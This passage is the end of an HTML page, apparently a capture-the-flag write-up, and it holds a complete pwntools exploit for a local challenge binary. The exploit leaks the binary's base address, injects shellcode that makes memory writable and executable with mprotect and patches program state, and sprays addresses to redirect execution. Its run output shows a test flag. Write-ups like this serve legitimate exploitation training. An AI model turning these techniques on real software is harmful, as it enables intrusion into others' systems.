+    mov rdi, {hex(binary_base + 0x49e78)} # $rdi = &range
+    mov dword ptr [rdi], 0xff             # range = randint(0xff)
+
+    ret                                   # return
+""")</span>
+</code></pre></div></div><br>
+
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="ve">#!/usr/bin/python3
+from pwn import process, asm, p64, log, hashlib
+
+shell = process("./chal")
+
+shell.sendlineafter(b"> ", b"3")
+shell.sendlineafter(b": ", b"admin")
+shell.sendlineafter(b": ", b"MM\x11N")
+
+shell.sendlineafter(b"> ", b"-1000")
+shell.recvuntil(b": ")
+
+binary_base = int(shell.recvline().strip()) - 0x68970
+
+shellcode = asm(f"""
+    mov rdi, {hex(binary_base + 0x36000)} # $rdi = .text
+    mov rsi, 0x20000                      # $rsi = size
+    mov rdx, 0x7                          # $rdx = rwx
+    push 0xa                              # mprotect()
+    pop rax                               # $rax = mprotect()
+    syscall                               # syscall
+
+    mov rdi, {hex(binary_base + 0x40171)} # $rdi = &salir()
+    mov byte ptr [rdi], 0xc3              # salir() = ret
+    mov rdi, {hex(binary_base + 0x49ea6)} # $rdi = &timeout
+    mov dword ptr [rdi], 0x493e0          # timeout = 5 mins
+
+    mov rdi, {hex(binary_base + 0x4ab67)} # $rdi = &check
+    mov byte ptr [rdi], 0x1               # check = true
+    mov rdi, {hex(binary_base + 0x49e78)} # $rdi = &range
+    mov dword ptr [rdi], 0xff             # range = randint(0xff)
+
+    ret                                   # return
+""", arch="amd64")
+
+shell.sendlineafter(b"> ", b"21222")
+shell.sendlineafter(b": \n", str(len(shellcode)).encode())
+shell.sendlineafter(b":", shellcode)
+shell.recvuntil(b": ")
+
+rwx = int(shell.recvline().strip())
+payload = p64(rwx) * 512
+
+shell.sendlineafter(b"> ", b"2")
+shell.sendlineafter(b"> ", b"-2196")
+shell.sendlineafter(b": ", str(len(payload)).encode())
+shell.sendlineafter(b": ", payload)
+
+shell.recvline_contains(b"vigilando...")
+
+shellcode = asm("""
+    push 0x5                 # /print_flag stdout
+    pop rdi                  # $rdi = fd
+    mov rsi, rsp             # $rsi = flag
+    push 0x1f                # len(flag) = 31
+    pop rdx                  # $rdx = len(flag)
+    xor rax, rax             # $rax = read()
+    syscall                  # syscall
+
+    push 0x1                 # stdout
+    pop rdi                  # $rdi = stdout
+    mov rax, rdi             # $rax = write()
+    syscall                  # syscall
+
+    push 0x4                 # /print_flag stdin
+    pop rdi                  # $rdi = fd
+    mov rax, 0xa6e77706c796d # $rax = "mylpwn"
+    push rax                 # $rsp = &"mylpwn"
+    mov rsi, rsp             # $rsi = token
+    push 0x7                 # len(token) = 7
+    pop rdx                  # $rdx = len(token)
+    push 0x1                 # write()
+    pop rax                  # $rax = write()
+    syscall                  # syscall
+
+    push 0x5                 # /print_flag stdout
+    pop rdi                  # $rdi = fd
+    push 0x21                # len(nonce) = 33
+    pop rdx                  # $rdx = len(nonce)
+    xor rax, rax             # $rax = read()
+    syscall                  # syscall
+
+    push 0x1                 # stdout
+    pop rdi                  # $rdi = stdout
+    mov rax, rdi             # $rax = write()
+    syscall                  # syscall
+
+    xor rdi, rdi             # $rdi = stdin
+    push 0x41                # len(answer) = 65
+    pop rdx                  # $rdx = len(answer)
+    xor rax, rax             # $rax = read()
+    syscall                  # syscall
+
+    push 0x4                 # /print_flag stdin
+    pop rdi                  # $rdi = fd
+    push 0x1                 # write()
+    pop rax                  # $rax = write()
+    syscall                  # syscall
+
+    push 0x5                 # /print_flag stdout
+    pop rdi                  # $rdi = fd
+    xor rax, rax             # $rax = read()
+    syscall                  # syscall
+
+    push 0x1                 # stdout
+    pop rdi                  # $rdi = stdout
+    mov rax, rdi             # $rax = write()
+    syscall                  # syscall
+""", arch="amd64")
+
+shell.sendline(b"21222")
+shell.sendlineafter(b": \n", str(len(shellcode)).encode())
+shell.sendlineafter(b":", shellcode)
+shell.recvuntil(b": ")
+
+rwx = int(shell.recvline().strip())
+payload = p64(rwx) * 512
+
+shell.sendlineafter(b"> ", b"2")
+shell.sendlineafter(b"> ", b"-2196")
+shell.sendlineafter(b": ", str(len(payload)).encode())
+shell.sendlineafter(b": ", payload)
+
+shell.recvline_contains(b"hackdef")
+nonce = shell.recv(32)
+
+def sha256(nonce):
+    hash = bytes.fromhex(nonce.decode())
+    for i in range(0x1300000):
+        hash = hashlib.sha256(hash).digest()
+    return hash
+
+answer = sha256(nonce).hex().upper()
+shell.sendline(b"A" + answer.encode())
+
+flag = shell.recvline_contains(b"hackdef")
+log.info(f"Flag: {flag.decode()}")</span>
+</code></pre></div></div><br>
+
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="ve">❯ python3 exploit.py
+[+] Starting local process './chal': pid 30127
+[*] Flag: hackdef{mylpwn_f4k3_fl4g_4_t35t1ng}
+[*] Stopped process './chal' (pid 30127)</span>
+</code></pre></div></div><br>
+
+</section>
+
+</article>
+  </div>
+  <footer class="footer">
+    <span class="footer__copyright">&copy; 2024 - xchg2pwn</span>
+  </footer><br><br>
+
+<script type="text/javascript" src="/js/jquery.min.js"></script>
+<script type="text/javascript" src="/js/main.js?1678894953382991917"></script>
+
+    </div>
+  </body>
+</html>
